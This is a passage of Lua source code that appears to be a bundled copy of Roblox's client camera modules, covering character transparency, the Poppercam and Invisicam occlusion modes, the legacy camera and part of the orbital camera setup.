					if self.toolDescendantRemovingConns[object] then self.toolDescendantRemovingConns[object]:disconnect() end
					self.toolDescendantRemovingConns[object] = object.DescendantRemoving:Connect(function(formerToolChild)
						wait() -- wait for new parent
						if character and formerToolChild and formerToolChild:IsDescendantOf(character) then
							if self:IsValidPartToModify(formerToolChild) then
								self.cachedParts[formerToolChild] = true
								self.transparencyDirty = true
							end
						end
					end)
				end
			end)
			if self.descendantRemovingConn then self.descendantRemovingConn:disconnect() end
			self.descendantRemovingConn = character.DescendantRemoving:connect(function(object)
				if self.cachedParts[object] then
					self.cachedParts[object] = nil
					-- Reset the transparency
					object.LocalTransparencyModifier = 0
				end
			end)
			self:CachePartsRecursive(character)
		end


		function TransparencyController:Enable(enable)
			if self.enabled ~= enable then
				self.enabled = enable
				self:Update()
			end
		end

		function TransparencyController:SetSubject(subject)
			local character = nil
			if subject and subject:IsA("Humanoid") then
				character = subject.Parent
			end
			if subject and subject:IsA("VehicleSeat") and subject.Occupant then
				character = subject.Occupant.Parent
			end
			if character then
				self:SetupTransparency(character)
			else
				self:TeardownTransparency()
			end
		end

		function TransparencyController:Update()
			local instant = false
			local now = tick()
			local currentCamera = workspace.CurrentCamera

			if currentCamera then
				local transparency = 0
				if not self.enabled then
					instant = true
				else
					local distance = (currentCamera.Focus.p - currentCamera.CoordinateFrame.p).magnitude
					transparency = (distance<2) and (1.0-(distance-0.5)/1.5) or 0 --(7 - distance) / 5
					if transparency < 0.5 then
						transparency = 0
					end

					if self.lastTransparency then
						local deltaTransparency = transparency - self.lastTransparency

						-- Don't tween transparency if it is instant or your character was fully invisible last frame
						if not instant and transparency < 1 and self.lastTransparency < 0.95 then
							local maxDelta = MAX_TWEEN_RATE * (now - self.lastUpdate)
							deltaTransparency = math.clamp(deltaTransparency, -maxDelta, maxDelta)
						end
						transparency = self.lastTransparency + deltaTransparency
					else
						self.transparencyDirty = true
					end

					transparency = math.clamp(Util.Round(transparency, 2), 0, 1)
				end

				if self.transparencyDirty or self.lastTransparency ~= transparency then
					for child, _ in pairs(self.cachedParts) do
						child.LocalTransparencyModifier = transparency
					end
					self.transparencyDirty = false
					self.lastTransparency = transparency
				end
			end
			self.lastUpdate = now
		end

		return TransparencyController
	end

	function _Poppercam()
		local ZoomController =  _ZoomController()

		local TransformExtrapolator = {} do
			TransformExtrapolator.__index = TransformExtrapolator

			local CF_IDENTITY = CFrame.new()

			local function cframeToAxis(cframe)
				local axis, angle = cframe:toAxisAngle()
				return axis*angle
			end

			local function axisToCFrame(axis)
				local angle = axis.magnitude
				if angle > 1e-5 then
					return CFrame.fromAxisAngle(axis, angle)
				end
				return CF_IDENTITY
			end

			local function extractRotation(cf)
				local _, _, _, xx, yx, zx, xy, yy, zy, xz, yz, zz = cf:components()
				return CFrame.new(0, 0, 0, xx, yx, zx, xy, yy, zy, xz, yz, zz)
			end

			function TransformExtrapolator.new()
				return setmetatable({
					lastCFrame = nil,
				}, TransformExtrapolator)
			end

			function TransformExtrapolator:Step(dt, currentCFrame)
				local lastCFrame = self.lastCFrame or currentCFrame
				self.lastCFrame = currentCFrame

				local currentPos = currentCFrame.p
				local currentRot = extractRotation(currentCFrame)

				local lastPos = lastCFrame.p
				local lastRot = extractRotation(lastCFrame)

				-- Estimate velocities from the delta between now and the last frame
				-- This estimation can be a little noisy.
				local dp = (currentPos - lastPos)/dt
				local dr = cframeToAxis(currentRot*lastRot:inverse())/dt

				local function extrapolate(t)
					local p = dp*t + currentPos
					local r = axisToCFrame(dr*t)*currentRot
					return r + p
				end

				return {
					extrapolate = extrapolate,
					posVelocity = dp,
					rotVelocity = dr,
				}
			end

			function TransformExtrapolator:Reset()
				self.lastCFrame = nil
			end
		end

		--[[ The Module ]]--
		local BaseOcclusion = _BaseOcclusion()
		local Poppercam = setmetatable({}, BaseOcclusion)
		Poppercam.__index = Poppercam

		function Poppercam.new()
			local self = setmetatable(BaseOcclusion.new(), Poppercam)
			self.focusExtrapolator = TransformExtrapolator.new()
			return self
		end

		function Poppercam:GetOcclusionMode()
			return Enum.DevCameraOcclusionMode.Zoom
		end

		function Poppercam:Enable(enable)
			self.focusExtrapolator:Reset()
		end

		function Poppercam:Update(renderDt, desiredCameraCFrame, desiredCameraFocus, cameraController)
			local rotatedFocus = CFrame.new(desiredCameraFocus.p, desiredCameraCFrame.p)*CFrame.new(
			0, 0, 0,
			-1, 0, 0,
			0, 1, 0,
			0, 0, -1
			)
			local extrapolation = self.focusExtrapolator:Step(renderDt, rotatedFocus)
			local zoom = ZoomController.Update(renderDt, rotatedFocus, extrapolation)
			return rotatedFocus*CFrame.new(0, 0, zoom), desiredCameraFocus
		end

		-- Called when character is added
		function Poppercam:CharacterAdded(character, player)
		end

		-- Called when character is about to be removed
		function Poppercam:CharacterRemoving(character, player)
		end

		function Poppercam:OnCameraSubjectChanged(newSubject)
		end

		local ZoomController = _ZoomController()

		function Poppercam:Update(renderDt, desiredCameraCFrame, desiredCameraFocus, cameraController)
			local rotatedFocus = desiredCameraFocus * (desiredCameraCFrame - desiredCameraCFrame.p)
			local extrapolation = self.focusExtrapolator:Step(renderDt, rotatedFocus)
			local zoom = ZoomController.Update(renderDt, rotatedFocus, extrapolation)
			return rotatedFocus*CFrame.new(0, 0, zoom), desiredCameraFocus
		end

		return Poppercam
	end

	function _Invisicam()

		--[[ Top Level Roblox Services ]]--
		local PlayersService = game:GetService("Players")

		--[[ Constants ]]--
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local USE_STACKING_TRANSPARENCY = true	-- Multiple items between the subject and camera get transparency values that add up to TARGET_TRANSPARENCY
		local TARGET_TRANSPARENCY = 0.75 -- Classic Invisicam's Value, also used by new invisicam for parts hit by head and torso rays
		local TARGET_TRANSPARENCY_PERIPHERAL = 0.5 -- Used by new SMART_CIRCLE mode for items not hit by head and torso rays

		local MODE = {
			--CUSTOM = 1, 		-- Retired, unused
			LIMBS = 2, 			-- Track limbs
			MOVEMENT = 3, 		-- Track movement
			CORNERS = 4, 		-- Char model corners
			CIRCLE1 = 5, 		-- Circle of casts around character
			CIRCLE2 = 6, 		-- Circle of casts around character, camera relative
			LIMBMOVE = 7, 		-- LIMBS mode + MOVEMENT mode
			SMART_CIRCLE = 8, 	-- More sample points on and around character
			CHAR_OUTLINE = 9,	-- Dynamic outline around the character
		}

		local LIMB_TRACKING_SET = {
			-- Body parts common to R15 and R6
			['Head'] = true,

			-- Body parts unique to R6
			['Left Arm'] = true,
			['Right Arm'] = true,
			['Left Leg'] = true,
			['Right Leg'] = true,

			-- Body parts unique to R15
			['LeftLowerArm'] = true,
			['RightLowerArm'] = true,
			['LeftUpperLeg'] = true,
			['RightUpperLeg'] = true
		}

		local CORNER_FACTORS = {
			Vector3.new(1,1,-1),
			Vector3.new(1,-1,-1),
			Vector3.new(-1,-1,-1),
			Vector3.new(-1,1,-1)
		}

		local CIRCLE_CASTS = 10
		local MOVE_CASTS = 3
		local SMART_CIRCLE_CASTS = 24
		local SMART_CIRCLE_INCREMENT = 2.0 * math.pi / SMART_CIRCLE_CASTS
		local CHAR_OUTLINE_CASTS = 24

		-- Used to sanitize user-supplied functions
		local function AssertTypes(param, ...)
			local allowedTypes = {}
			local typeString = ''
			for _, typeName in pairs({...}) do
				allowedTypes[typeName] = true
				typeString = typeString .. (typeString == '' and '' or ' or ') .. typeName
			end
			local theType = type(param)
			assert(allowedTypes[theType], typeString .. " type expected, got: " .. theType)
		end

		-- Helper function for Determinant of 3x3, not in CameraUtils for performance reasons
		local function Det3x3(a,b,c,d,e,f,g,h,i)
			return (a*(e*i-f*h)-b*(d*i-f*g)+c*(d*h-e*g))
		end

		-- Smart Circle mode needs the intersection of 2 rays that are known to be in the same plane
		-- because they are generated from cross products with a common vector. This function is computing
		-- that intersection, but it's actually the general solution for the point halfway between where
		-- two skew lines come nearest to each other, which is more forgiving.
		local function RayIntersection(p0, v0, p1, v1)
			local v2 = v0:Cross(v1)
			local d1 = p1.x - p0.x
			local d2 = p1.y - p0.y
			local d3 = p1.z - p0.z
			local denom = Det3x3(v0.x,-v1.x,v2.x,v0.y,-v1.y,v2.y,v0.z,-v1.z,v2.z)

			if (denom == 0) then
				return ZERO_VECTOR3 -- No solution (rays are parallel)
			end

			local t0 = Det3x3(d1,-v1.x,v2.x,d2,-v1.y,v2.y,d3,-v1.z,v2.z) / denom
			local t1 = Det3x3(v0.x,d1,v2.x,v0.y,d2,v2.y,v0.z,d3,v2.z) / denom
			local s0 = p0 + t0 * v0
			local s1 = p1 + t1 * v1
			local s = s0 + 0.5 * ( s1 - s0 )

			-- 0.25 studs is a threshold for deciding if the rays are
			-- close enough to be considered intersecting, found through testing 
			if (s1-s0).Magnitude < 0.25 then
				return s
			else
				return ZERO_VECTOR3
			end
		end



		--[[ The Module ]]--
		local BaseOcclusion = _BaseOcclusion()
		local Invisicam = setmetatable({}, BaseOcclusion)
		Invisicam.__index = Invisicam

		function Invisicam.new()
			local self = setmetatable(BaseOcclusion.new(), Invisicam)

			self.char = nil
			self.humanoidRootPart = nil
			self.torsoPart = nil
			self.headPart = nil

			self.childAddedConn = nil
			self.childRemovedConn = nil

			self.behaviors = {} 	-- Map of modes to behavior fns
			self.behaviors[MODE.LIMBS] = self.LimbBehavior
			self.behaviors[MODE.MOVEMENT] = self.MoveBehavior
			self.behaviors[MODE.CORNERS] = self.CornerBehavior
			self.behaviors[MODE.CIRCLE1] = self.CircleBehavior
			self.behaviors[MODE.CIRCLE2] = self.CircleBehavior
			self.behaviors[MODE.LIMBMOVE] = self.LimbMoveBehavior
			self.behaviors[MODE.SMART_CIRCLE] = self.SmartCircleBehavior
			self.behaviors[MODE.CHAR_OUTLINE] = self.CharacterOutlineBehavior

			self.mode = MODE.SMART_CIRCLE
			self.behaviorFunction = self.SmartCircleBehavior

			self.savedHits = {} 	-- Objects currently being faded in/out
			self.trackedLimbs = {}	-- Used in limb-tracking casting modes

			self.camera = game.Workspace.CurrentCamera

			self.enabled = false
			return self
		end

		function Invisicam:Enable(enable)
			self.enabled = enable

			if not enable then
				self:Cleanup()
			end
		end

		function Invisicam:GetOcclusionMode()
			return Enum.DevCameraOcclusionMode.Invisicam
		end

		--[[ Module functions ]]--
		function Invisicam:LimbBehavior(castPoints)
			for limb, _ in pairs(self.trackedLimbs) do
				castPoints[#castPoints + 1] = limb.Position
			end
		end

		function Invisicam:MoveBehavior(castPoints)
			for i = 1, MOVE_CASTS do
				local position, velocity = self.humanoidRootPart.Position, self.humanoidRootPart.Velocity
				local horizontalSpeed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude / 2
				local offsetVector = (i - 1) * self.humanoidRootPart.CFrame.lookVector * horizontalSpeed
				castPoints[#castPoints + 1] = position + offsetVector
			end
		end

		function Invisicam:CornerBehavior(castPoints)
			local cframe = self.humanoidRootPart.CFrame
			local centerPoint = cframe.p
			local rotation = cframe - centerPoint
			local halfSize = self.char:GetExtentsSize() / 2 --NOTE: Doesn't update w/ limb animations
			castPoints[#castPoints + 1] = centerPoint
			for i = 1, #CORNER_FACTORS do
				castPoints[#castPoints + 1] = centerPoint + (rotation * (halfSize * CORNER_FACTORS[i]))
			end
		end

		function Invisicam:CircleBehavior(castPoints)
			local cframe
			if self.mode == MODE.CIRCLE1 then
				cframe = self.humanoidRootPart.CFrame
			else
				local camCFrame = self.camera.CoordinateFrame
				cframe = camCFrame - camCFrame.p + self.humanoidRootPart.Position
			end
			castPoints[#castPoints + 1] = cframe.p
			for i = 0, CIRCLE_CASTS - 1 do
				local angle = (2 * math.pi / CIRCLE_CASTS) * i
				local offset = 3 * Vector3.new(math.cos(angle), math.sin(angle), 0)
				castPoints[#castPoints + 1] = cframe * offset
			end
		end

		function Invisicam:LimbMoveBehavior(castPoints)
			self:LimbBehavior(castPoints)
			self:MoveBehavior(castPoints)
		end

		function Invisicam:CharacterOutlineBehavior(castPoints)
			local torsoUp = self.torsoPart.CFrame.upVector.unit
			local torsoRight = self.torsoPart.CFrame.rightVector.unit

			-- Torso cross of points for interior coverage
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoUp
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoUp
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoRight
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoRight
			if self.headPart then
				castPoints[#castPoints + 1] = self.headPart.CFrame.p
			end

			local cframe = CFrame.new(ZERO_VECTOR3,Vector3.new(self.camera.CoordinateFrame.lookVector.X,0,self.camera.CoordinateFrame.lookVector.Z))
			local centerPoint = (self.torsoPart and self.torsoPart.Position or self.humanoidRootPart.Position)

			local partsWhitelist = {self.torsoPart}
			if self.headPart then
				partsWhitelist[#partsWhitelist + 1] = self.headPart
			end

			for i = 1, CHAR_OUTLINE_CASTS do
				local angle = (2 * math.pi * i / CHAR_OUTLINE_CASTS)
				local offset = cframe * (3 * Vector3.new(math.cos(angle), math.sin(angle), 0))

				offset = Vector3.new(offset.X, math.max(offset.Y, -2.25), offset.Z)	

				local ray = Ray.new(centerPoint + offset, -3 * offset)
				local hit, hitPoint = game.Workspace:FindPartOnRayWithWhitelist(ray, partsWhitelist, false, false)

				if hit then
					-- Use hit point as the cast point, but nudge it slightly inside the character so that bumping up against
					-- walls is less likely to cause a transparency glitch
					castPoints[#castPoints + 1] = hitPoint + 0.2 * (centerPoint - hitPoint).unit
				end
			end
		end

		function Invisicam:SmartCircleBehavior(castPoints)
			local torsoUp = self.torsoPart.CFrame.upVector.unit
			local torsoRight = self.torsoPart.CFrame.rightVector.unit

			-- SMART_CIRCLE mode includes rays to head and 5 to the torso.
			-- Hands, arms, legs and feet are not included since they
			-- are not canCollide and can therefore go inside of parts
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoUp
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoUp
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoRight
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoRight
			if self.headPart then
				castPoints[#castPoints + 1] = self.headPart.CFrame.p
			end

			local cameraOrientation = self.camera.CFrame - self.camera.CFrame.p
			local torsoPoint = Vector3.new(0,0.5,0) + (self.torsoPart and self.torsoPart.Position or self.humanoidRootPart.Position)
			local radius = 2.5

			-- This loop first calculates points in a circle of radius 2.5 around the torso of the character, in the
			-- plane orthogonal to the camera's lookVector. Each point is then raycast to, to determine if it is within
			-- the free space surrounding the player (not inside anything). Two iterations are done to adjust points that
			-- are inside parts, to try to move them to valid locations that are still on their camera ray, so that the
			-- circle remains circular from the camera's perspective, but does not cast rays into walls or parts that are
			-- behind, below or beside the character and not really obstructing view of the character. This minimizes
			-- the undesirable situation where the character walks up to an exterior wall and it is made invisible even
			-- though it is behind the character.
			for i = 1, SMART_CIRCLE_CASTS do
				local angle = SMART_CIRCLE_INCREMENT * i - 0.5 * math.pi
				local offset = radius * Vector3.new(math.cos(angle), math.sin(angle), 0)
				local circlePoint = torsoPoint + cameraOrientation * offset

				-- Vector from camera to point on the circle being tested
				local vp = circlePoint - self.camera.CFrame.p

				local ray = Ray.new(torsoPoint, circlePoint - torsoPoint)
				local hit, hp, hitNormal = game.Workspace:FindPartOnRayWithIgnoreList(ray, {self.char}, false, false )
				local castPoint = circlePoint

				if hit then
					local hprime = hp + 0.1 * hitNormal.unit -- Slightly offset hit point from the hit surface
					local v0 = hprime - torsoPoint -- Vector from torso to offset hit point

					local perp = (v0:Cross(vp)).unit

					-- Vector from the offset hit point, along the hit surface
					local v1 = (perp:Cross(hitNormal)).unit

					-- Vector from camera to offset hit
					local vprime = (hprime - self.camera.CFrame.p).unit

					-- This dot product checks to see if the vector along the hit surface would hit the correct
					-- side of the invisicam cone, or if it would cross the camera look vector and hit the wrong side
					if ( v0.unit:Dot(-v1) < v0.unit:Dot(vprime)) then
						castPoint = RayIntersection(hprime, v1, circlePoint, vp)

						if castPoint.Magnitude > 0 then
							local ray = Ray.new(hprime, castPoint - hprime)
							local hit, hitPoint, hitNormal = game.Workspace:FindPartOnRayWithIgnoreList(ray, {self.char}, false, false )

							if hit then
								local hprime2 = hitPoint + 0.1 * hitNormal.unit
								castPoint = hprime2
							end
						else
							castPoint = hprime
						end
					else
						castPoint = hprime
					end

					local ray = Ray.new(torsoPoint, (castPoint - torsoPoint))
					local hit, hitPoint, hitNormal = game.Workspace:FindPartOnRayWithIgnoreList(ray, {self.char}, false, false )

					if hit then
						local castPoint2 = hitPoint - 0.1 * (castPoint - torsoPoint).unit
						castPoint = castPoint2
					end
				end

				castPoints[#castPoints + 1] = castPoint
			end
		end

		function Invisicam:CheckTorsoReference()
			if self.char then
				self.torsoPart = self.char:FindFirstChild("Torso")
				if not self.torsoPart then
					self.torsoPart = self.char:FindFirstChild("UpperTorso")
					if not self.torsoPart then
						self.torsoPart = self.char:FindFirstChild("HumanoidRootPart")
					end
				end

				self.headPart = self.char:FindFirstChild("Head")
			end
		end

		function Invisicam:CharacterAdded(char, player)
			-- We only want the LocalPlayer's character
			if player~=PlayersService.LocalPlayer then return end

			if self.childAddedConn then
				self.childAddedConn:Disconnect()
				self.childAddedConn = nil
			end
			if self.childRemovedConn then
				self.childRemovedConn:Disconnect()
				self.childRemovedConn = nil
			end

			self.char = char

			self.trackedLimbs = {}
			local function childAdded(child)
				if child:IsA("BasePart") then
					if LIMB_TRACKING_SET[child.Name] then
						self.trackedLimbs[child] = true
					end

					if child.Name == "Torso" or child.Name == "UpperTorso" then
						self.torsoPart = child
					end

					if child.Name == "Head" then
						self.headPart = child
					end
				end
			end

			local function childRemoved(child)
				self.trackedLimbs[child] = nil

				-- If removed/replaced part is 'Torso' or 'UpperTorso' double check that we still have a TorsoPart to use
				self:CheckTorsoReference()
			end

			self.childAddedConn = char.ChildAdded:Connect(childAdded)
			self.childRemovedConn = char.ChildRemoved:Connect(childRemoved)
			for _, child in pairs(self.char:GetChildren()) do
				childAdded(child)
			end
		end

		function Invisicam:SetMode(newMode)
			AssertTypes(newMode, 'number')
			for _, modeNum in pairs(MODE) do
				if modeNum == newMode then
					self.mode = newMode
					self.behaviorFunction = self.behaviors[self.mode]
					return
				end
			end
			error("Invalid mode number")
		end

		function Invisicam:GetObscuredParts()
			return self.savedHits
		end

		-- Want to turn off Invisicam? Be sure to call this after.
		function Invisicam:Cleanup()
			for hit, originalFade in pairs(self.savedHits) do
				hit.LocalTransparencyModifier = originalFade
			end
		end

		function Invisicam:Update(dt, desiredCameraCFrame, desiredCameraFocus)
			-- Bail if there is no Character
			if not self.enabled or not self.char then
				return desiredCameraCFrame, desiredCameraFocus
			end

			self.camera = game.Workspace.CurrentCamera

			-- TODO: Move this to a GetHumanoidRootPart helper, probably combine with CheckTorsoReference
			-- Make sure we still have a HumanoidRootPart
			if not self.humanoidRootPart then
				local humanoid = self.char:FindFirstChildOfClass("Humanoid")
				if humanoid and humanoid.RootPart then
					self.humanoidRootPart = humanoid.RootPart
				else
					-- Not set up with Humanoid? Try and see if there's one in the Character at all:
					self.humanoidRootPart = self.char:FindFirstChild("HumanoidRootPart")
					if not self.humanoidRootPart then
						-- Bail out, since we're relying on HumanoidRootPart existing
						return desiredCameraCFrame, desiredCameraFocus
					end
				end

				-- TODO: Replace this with something more sensible
				local ancestryChangedConn
				ancestryChangedConn = self.humanoidRootPart.AncestryChanged:Connect(function(child, parent)
					if child == self.humanoidRootPart and not parent then 
						self.humanoidRootPart = nil
						if ancestryChangedConn and ancestryChangedConn.Connected then
							ancestryChangedConn:Disconnect()
							ancestryChangedConn = nil
						end
					end
				end)
			end

			if not self.torsoPart then
				self:CheckTorsoReference()
				if not self.torsoPart then
					-- Bail out, since we're relying on Torso existing, should never happen since we fall back to using HumanoidRootPart as torso
					return desiredCameraCFrame, desiredCameraFocus
				end
			end

			-- Make a list of world points to raycast to
			local castPoints = {}
			self.behaviorFunction(self, castPoints)

			-- Cast to get a list of objects between the camera and the cast points
			local currentHits = {}
			local ignoreList = {self.char}
			local function add(hit)
				currentHits[hit] = true
				if not self.savedHits[hit] then
					self.savedHits[hit] = hit.LocalTransparencyModifier
				end
			end

			local hitParts
			local hitPartCount = 0

			-- Hash table to treat head-ray-hit parts differently than the rest of the hit parts hit by other rays
			-- head/torso ray hit parts will be more transparent than peripheral parts when USE_STACKING_TRANSPARENCY is enabled
			local headTorsoRayHitParts = {}

			local perPartTransparencyHeadTorsoHits = TARGET_TRANSPARENCY
			local perPartTransparencyOtherHits = TARGET_TRANSPARENCY

			if USE_STACKING_TRANSPARENCY then

				-- This first call uses head and torso rays to find out how many parts are stacked up
				-- for the purpose of calculating required per-part transparency
				local headPoint = self.headPart and self.headPart.CFrame.p or castPoints[1]
				local torsoPoint = self.torsoPart and self.torsoPart.CFrame.p or castPoints[2]
				hitParts = self.camera:GetPartsObscuringTarget({headPoint, torsoPoint}, ignoreList)

				-- Count how many things the sample rays passed through, including decals. This should only
				-- count decals facing the camera, but GetPartsObscuringTarget does not return surface normals,
				-- so my compromise for now is to just let any decal increase the part count by 1. Only one
				-- decal per part will be considered.
				for i = 1, #hitParts do
					local hitPart = hitParts[i]
					hitPartCount = hitPartCount + 1 -- count the part itself
					headTorsoRayHitParts[hitPart] = true
					for _, child in pairs(hitPart:GetChildren()) do
						if child:IsA('Decal') or child:IsA('Texture') then
							hitPartCount = hitPartCount + 1 -- count first decal hit, then break
							break
						end
					end
				end

				if (hitPartCount > 0) then
					perPartTransparencyHeadTorsoHits = math.pow( ((0.5 * TARGET_TRANSPARENCY) + (0.5 * TARGET_TRANSPARENCY / hitPartCount)), 1 / hitPartCount )
					perPartTransparencyOtherHits = math.pow( ((0.5 * TARGET_TRANSPARENCY_PERIPHERAL) + (0.5 * TARGET_TRANSPARENCY_PERIPHERAL / hitPartCount)), 1 / hitPartCount )
				end
			end

			-- Now get all the parts hit by all the rays
			hitParts = self.camera:GetPartsObscuringTarget(castPoints, ignoreList)

			local partTargetTransparency = {}

			-- Include decals and textures
			for i = 1, #hitParts do
				local hitPart = hitParts[i]

				partTargetTransparency[hitPart] =headTorsoRayHitParts[hitPart] and perPartTransparencyHeadTorsoHits or perPartTransparencyOtherHits

				-- If the part is not already as transparent or more transparent than what invisicam requires, add it to the list of
				-- parts to be modified by invisicam
				if hitPart.Transparency < partTargetTransparency[hitPart] then
					add(hitPart)
				end

				-- Check all decals and textures on the part
				for _, child in pairs(hitPart:GetChildren()) do
					if child:IsA('Decal') or child:IsA('Texture') then
						if (child.Transparency < partTargetTransparency[hitPart]) then
							partTargetTransparency[child] = partTargetTransparency[hitPart]
							add(child)
						end
					end
				end
			end

			-- Invisibilize objects that are in the way, restore those that aren't anymore
			for hitPart, originalLTM in pairs(self.savedHits) do
				if currentHits[hitPart] then
					-- LocalTransparencyModifier gets whatever value is required to print the part's total transparency to equal perPartTransparency
					hitPart.LocalTransparencyModifier = (hitPart.Transparency < 1) and ((partTargetTransparency[hitPart] - hitPart.Transparency) / (1.0 - hitPart.Transparency)) or 0
				else -- Restore original pre-invisicam value of LTM
					hitPart.LocalTransparencyModifier = originalLTM
					self.savedHits[hitPart] = nil
				end
			end

			-- Invisicam does not change the camera values
			return desiredCameraCFrame, desiredCameraFocus
		end

		return Invisicam
	end

	function _LegacyCamera()

		local ZERO_VECTOR2 = Vector2.new(0,0)

		local Util = _CameraUtils()

		--[[ Services ]]--
		local PlayersService = game:GetService('Players')

		--[[ The Module ]]--
		local BaseCamera = _BaseCamera()
		local LegacyCamera = setmetatable({}, BaseCamera)
		LegacyCamera.__index = LegacyCamera

		function LegacyCamera.new()
			local self = setmetatable(BaseCamera.new(), LegacyCamera)

			self.cameraType = Enum.CameraType.Fixed
			self.lastUpdate = tick()
			self.lastDistanceToSubject = nil

			return self
		end

		function LegacyCamera:GetModuleName()
			return "LegacyCamera"
		end

		--[[ Functions overridden from BaseCamera ]]--
		function LegacyCamera:SetCameraToSubjectDistance(desiredSubjectDistance)
			return BaseCamera.SetCameraToSubjectDistance(self,desiredSubjectDistance)
		end

		function LegacyCamera:Update(dt)

			-- Cannot update until cameraType has been set
			if not self.cameraType then return end

			local now = tick()
			local timeDelta = (now - self.lastUpdate)
			local camera = 	workspace.CurrentCamera
			local newCameraCFrame = camera.CFrame
			local newCameraFocus = camera.Focus
			local player = PlayersService.LocalPlayer

			if self.lastUpdate == nil or timeDelta > 1 then
				self.lastDistanceToSubject = nil
			end
			local subjectPosition = self:GetSubjectPosition()

			if self.cameraType == Enum.CameraType.Fixed then
				if self.lastUpdate then
					-- Cap out the delta to 0.1 so we don't get some crazy things when we re-resume from
					local delta = math.min(0.1, now - self.lastUpdate)
					local gamepadRotation = self:UpdateGamepad()
					self.rotateInput = self.rotateInput + (gamepadRotation * delta)
				end

				if subjectPosition and player and camera then
					local distanceToSubject = self:GetCameraToSubjectDistance()
					local newLookVector = self:CalculateNewLookVector()
					self.rotateInput = ZERO_VECTOR2

					newCameraFocus = camera.Focus -- Fixed camera does not change focus
					newCameraCFrame = CFrame.new(camera.CFrame.p, camera.CFrame.p + (distanceToSubject * newLookVector))
				end
			elseif self.cameraType == Enum.CameraType.Attach then
				if subjectPosition and camera then
					local distanceToSubject = self:GetCameraToSubjectDistance()
					local humanoid = self:GetHumanoid()
					if self.lastUpdate and humanoid and humanoid.RootPart then

						-- Cap out the delta to 0.1 so we don't get some crazy things when we re-resume from
						local delta = math.min(0.1, now - self.lastUpdate)
						local gamepadRotation = self:UpdateGamepad()
						self.rotateInput = self.rotateInput + (gamepadRotation * delta)

						local forwardVector = humanoid.RootPart.CFrame.lookVector

						local y = Util.GetAngleBetweenXZVectors(forwardVector, self:GetCameraLookVector())
						if Util.IsFinite(y) then
							-- Preserve vertical rotation from user input
							self.rotateInput = Vector2.new(y, self.rotateInput.Y)
						end
					end

					local newLookVector = self:CalculateNewLookVector()
					self.rotateInput = ZERO_VECTOR2

					newCameraFocus = CFrame.new(subjectPosition)
					newCameraCFrame = CFrame.new(subjectPosition - (distanceToSubject * newLookVector), subjectPosition)
				end
			elseif self.cameraType == Enum.CameraType.Watch then
				if subjectPosition and player and camera then
					local cameraLook = nil

					local humanoid = self:GetHumanoid()
					if humanoid and humanoid.RootPart then
						local diffVector = subjectPosition - camera.CFrame.p
						cameraLook = diffVector.unit

						if self.lastDistanceToSubject and self.lastDistanceToSubject == self:GetCameraToSubjectDistance() then
							-- Don't clobber the zoom if they zoomed the camera
							local newDistanceToSubject = diffVector.magnitude
							self:SetCameraToSubjectDistance(newDistanceToSubject)
						end
					end

					local distanceToSubject = self:GetCameraToSubjectDistance()
					local newLookVector = self:CalculateNewLookVector(cameraLook)
					self.rotateInput = ZERO_VECTOR2

					newCameraFocus = CFrame.new(subjectPosition)
					newCameraCFrame = CFrame.new(subjectPosition - (distanceToSubject * newLookVector), subjectPosition)

					self.lastDistanceToSubject = distanceToSubject
				end
			else
				-- Unsupported type, return current values unchanged
				return camera.CFrame, camera.Focus
			end

			self.lastUpdate = now
			return newCameraCFrame, newCameraFocus
		end

		return LegacyCamera
	end

	function _OrbitalCamera()

		-- Local private variables and constants
		local UNIT_Z = Vector3.new(0,0,1)
		local X1_Y0_Z1 = Vector3.new(1,0,1)	--Note: not a unit vector, used for projecting onto XZ plane
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local ZERO_VECTOR2 = Vector2.new(0,0)
		local TAU = 2 * math.pi

		--[[ Gamepad Support ]]--
		local THUMBSTICK_DEADZONE = 0.2

		-- Do not edit these values, they are not the developer-set limits, they are limits
		-- to the values the camera system equations can correctly handle
		local MIN_ALLOWED_ELEVATION_DEG = -80
		local MAX_ALLOWED_ELEVATION_DEG = 80

		local externalProperties = {}
		externalProperties["InitialDistance"]  = 25
		externalProperties["MinDistance"]      = 10
		externalProperties["MaxDistance"]      = 100
		externalProperties["InitialElevation"] = 35
		externalProperties["MinElevation"]     = 35
		externalProperties["MaxElevation"]     = 35
		externalProperties["ReferenceAzimuth"] = -45	-- Angle around the Y axis where the camera starts. -45 offsets the camera in the -X and +Z directions equally
		externalProperties["CWAzimuthTravel"]  = 90	-- How many degrees the camera is allowed to rotate from the reference position, CW as seen from above
		externalProperties["CCWAzimuthTravel"] = 90	-- How many degrees the camera is allowed to rotate from the reference position, CCW as seen from above
		externalProperties["UseAzimuthLimits"] = false -- Full rotation around Y axis available by default

		local Util = _CameraUtils()

		--[[ Services ]]--
		local PlayersService = game:GetService('Players')
		local VRService = game:GetService("VRService")

		--[[ The Module ]]--
		local BaseCamera = _BaseCamera()
		local OrbitalCamera = setmetatable({}, BaseCamera)
		OrbitalCamera.__index = OrbitalCamera


		function OrbitalCamera.new()
			local self = setmetatable(BaseCamera.new(), OrbitalCamera)

			self.lastUpdate = tick()

			-- OrbitalCamera-specific members
			self.changedSignalConnections = {}
			self.refAzimuthRad = nil
			self.curAzimuthRad = nil
			self.minAzimuthAbsoluteRad = nil
			self.maxAzimuthAbsoluteRad = nil
			self.useAzimuthLimits = nil
			self.curElevationRad = nil
			self.minElevationRad = nil
			self.maxElevationRad = nil
			self.curDistance = nil
			self.minDistance = nil
			self.maxDistance = nil

			-- Gamepad
			self.r3ButtonDown = false
			self.l3ButtonDown = false
			self.gamepadDollySpeedMultiplier = 1

			self.lastUserPanCamera = tick()

			self.externalProperties = {}
			self.externalProperties["InitialDistance"] 	= 25
			self.externalProperties["MinDistance"] 		= 10
			self.externalProperties["MaxDistance"] 		= 100
			self.externalProperties["InitialElevation"] 	= 35
			self.externalProperties["MinElevation"] 		= 35
			self.externalProperties["MaxElevation"] 		= 35
